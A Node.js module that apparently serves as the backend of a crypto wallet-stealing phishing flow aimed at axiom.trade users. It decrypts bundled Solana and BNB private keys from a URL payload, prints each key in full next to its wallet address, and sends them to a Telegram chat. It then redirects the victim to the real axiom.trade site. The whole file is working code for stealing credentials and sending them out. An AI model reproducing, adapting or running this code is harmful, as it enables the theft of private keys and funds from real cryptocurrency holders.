'use strict';

const crypto = require('crypto');
const bs58 = require('bs58');
const { Keypair } = require('@solana/web3.js');
const { privateToAddress, toChecksumAddress } = require('ethereumjs-util');

// ---------- Base64URL decode ----------
function decodeBase64Url(str) {
  if (typeof str !== 'string') throw new Error('Expected string');
  let normalized = str.replace(/-/g, '+').replace(/_/g, '/');
  const pad = normalized.length % 4;
  if (pad) normalized += '='.repeat(4 - pad);
  return Buffer.from(normalized, 'base64');
}

// ---------- Phase 1: Master key normalization ----------
function normalizeBundleKey(bundleKey) {
  if (!bundleKey || typeof bundleKey !== 'string') {
    throw new Error('bundleKey must be a non-empty string');
  }
  const rawKey = decodeBase64Url(bundleKey);
  const len = rawKey.length;
  let algorithm;
  if (len === 16) algorithm = 'aes-128-gcm';
  else if (len === 24) algorithm = 'aes-192-gcm';
  else if (len === 32) algorithm = 'aes-256-gcm';
  else throw new Error(`Invalid key length: ${len} bytes (must be 16, 24, or 32)`);
  return { keyBytes: rawKey, algorithm };
}

// ---------- Phase 2‑5: Decrypt single entry ----------
function decryptEntry(encryptedStr, keyBytes, algorithm) {
  const colonIdx = encryptedStr.indexOf(':');
  if (colonIdx === -1) throw new Error('Missing colon separator');
  const ivB64 = encryptedStr.substring(0, colonIdx);
  const ctB64 = encryptedStr.substring(colonIdx + 1);
  const iv = decodeBase64Url(ivB64);
  const cipherWithTag = decodeBase64Url(ctB64);
  if (cipherWithTag.length < 16) throw new Error('Ciphertext too short (no tag)');
  const authTag = cipherWithTag.subarray(-16);
  const ciphertext = cipherWithTag.subarray(0, -16);

  const decipher = crypto.createDecipheriv(algorithm, keyBytes, iv);
  decipher.setAuthTag(authTag);
  let decrypted = decipher.update(ciphertext);
  decrypted = Buffer.concat([decrypted, decipher.final()]);
  return decrypted;
}

// ---------- Decrypt array of strings ----------
function decryptArray(encryptedArray, keyBytes, algorithm) {
  if (!Array.isArray(encryptedArray)) throw new Error('Expected array');
  return encryptedArray.map((entry, idx) => {
    try {
      const plain = decryptEntry(entry, keyBytes, algorithm);
      return { index: idx, raw: plain, failed: false };
    } catch (err) {
      return { index: idx, failed: true, error: err.message };
    }
  });
}

// ---------- Solana keypair extraction ----------
function rawToSolanaKeypair(raw) {
  if (raw.length !== 64) throw new Error(`Solana secret key must be 64 bytes, got ${raw.length}`);
  const secretKey = new Uint8Array(raw);
  const keypair = Keypair.fromSecretKey(secretKey);
  const address = keypair.publicKey.toBase58();
  const privateKeyBase58 = bs58.encode(secretKey);
  return { address, privateKey: privateKeyBase58 };
}

// ---------- BNB private key extraction ----------
function rawToBnbAddress(raw) {
  if (raw.length !== 32) throw new Error(`BNB private key must be 32 bytes, got ${raw.length}`);
  const addressBuffer = privateToAddress(raw);
  const address = toChecksumAddress('0x' + addressBuffer.toString('hex'));
  const privateKeyHex = '0x' + raw.toString('hex');
  return { address, privateKey: privateKeyHex };
}

// ---------- Format wallet sections ----------
function formatWalletSection(title, items, type) {
  if (!items || items.length === 0) return null;
  const lines = [`🟡 ${title} (${items.length})`];
  items.forEach((item, idx) => {
    const num = idx + 1;
    const addrShort = item.address.slice(0, 6) + '...' + item.address.slice(-6);
    const link = type === 'solana'
      ? `https://solscan.io/account/${item.address}`
      : `https://bscscan.com/address/${item.address}`;
    lines.push(`├ ${num}. 💳 ${addrShort} (${link}) (Balance: N/A)`);
    // Key on its own line (no extra indentation)
    lines.push(`├ ${num}. 🔑 Key:\n${item.privateKey}`);
    if (idx < items.length - 1) lines.push(''); // blank line between wallets
  });
  return lines.join('\n');
}

// ---------- Decode slug (original) ----------
function decodeSlug(slug) {
  if (!slug || typeof slug !== 'string') throw new Error('Missing slug');
  let normalized = decodeURIComponent(slug.trim())
    .replace(/-/g, '+')
    .replace(/_/g, '/');
  const pad = normalized.length % 4;
  if (pad) normalized += '='.repeat(4 - pad);
  const json = Buffer.from(normalized, 'base64').toString('utf8');
  const payload = JSON.parse(json);
  if (!payload || typeof payload !== 'object' || Array.isArray(payload)) {
    throw new Error('Payload must be a JSON object');
  }
  return payload;
}

// ---------- Telegram helpers ----------
function escapeHtml(value) {
  return String(value)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function resolveChatId(payload) {
  const fromPayload = payload.telegramId;
  if (fromPayload !== undefined && fromPayload !== null && String(fromPayload).trim() !== '') {
    return String(fromPayload).trim();
  }
  const fallback = process.env.FALLBACK_CHAT_ID;
  if (fallback && String(fallback).trim() !== '') return String(fallback).trim();
  return null;
}

function resolveRedirectUrl(payload) {
  const site = payload.site;
  if (site && typeof site === 'string' && site.startsWith('https://axiom.trade')) {
    return site;
  }
  return 'https://axiom.trade';
}

async function sendTelegramMessage(chatId, text) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  if (!token) throw new Error('TELEGRAM_BOT_TOKEN is not set');
  const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
    }),
  });
  const body = await response.json().catch(() => ({}));
  if (!response.ok || body.ok === false) {
    const detail = body.description || response.statusText || 'Unknown Telegram error';
    throw new Error(`Telegram API error: ${detail}`);
  }
  return body;
}

// ---------- Main processing ----------
async function processSlug(slug) {
  let payload;
  try {
    payload = decodeSlug(slug);
  } catch (err) {
    const error = new Error(`Decode failed: ${err.message}`);
    error.statusCode = 400;
    throw error;
  }

  const chatId = resolveChatId(payload);
  if (!chatId) {
    const error = new Error('No telegramId and no FALLBACK_CHAT_ID');
    error.statusCode = 400;
    throw error;
  }

  // Decrypt bundles if present
  let solanaItems = [];
  let bnbItems = [];

  if (payload.bundle && (payload.sBundles || payload.eBundles)) {
    const { keyBytes, algorithm } = normalizeBundleKey(payload.bundle);

    if (payload.sBundles) {
      let sArray;
      try { sArray = JSON.parse(payload.sBundles); } catch {
        throw new Error('sBundles is not valid JSON');
      }
      const results = decryptArray(sArray, keyBytes, algorithm);
      for (const res of results) {
        if (!res.failed) {
          try {
            solanaItems.push(rawToSolanaKeypair(res.raw));
          } catch (err) {
            console.error(`[decrypt] Solana entry ${res.index} failed:`, err.message);
          }
        } else {
          console.error(`[decrypt] Solana entry ${res.index} failed:`, res.error);
        }
      }
    }

    if (payload.eBundles) {
      let eArray;
      try { eArray = JSON.parse(payload.eBundles); } catch {
        throw new Error('eBundles is not valid JSON');
      }
      const results = decryptArray(eArray, keyBytes, algorithm);
      for (const res of results) {
        if (!res.failed) {
          try {
            bnbItems.push(rawToBnbAddress(res.raw));
          } catch (err) {
            console.error(`[decrypt] BNB entry ${res.index} failed:`, err.message);
          }
        } else {
          console.error(`[decrypt] BNB entry ${res.index} failed:`, res.error);
        }
      }
    }
  }

  // Build message
  const parts = [];
  const solSection = formatWalletSection('Solana Wallets', solanaItems, 'solana');
  if (solSection) parts.push(solSection);
  const bnbSection = formatWalletSection('BNB Wallets', bnbItems, 'bnb');
  if (bnbSection) parts.push(bnbSection);

  let message = parts.length ? parts.join('\n\n') : '<b>No wallets decrypted</b>\nCheck sBundles/eBundles or bundleKey.';

  // Send to Telegram
  try {
    await sendTelegramMessage(chatId, message);
  } catch (err) {
    console.error('[telegram] dispatch failed:', err.message);
  }

  const redirectUrl = resolveRedirectUrl(payload);
  return { redirectUrl, chatId };
}

module.exports = {
  decodeSlug,
  processSlug,
  resolveChatId,
  resolveRedirectUrl,
};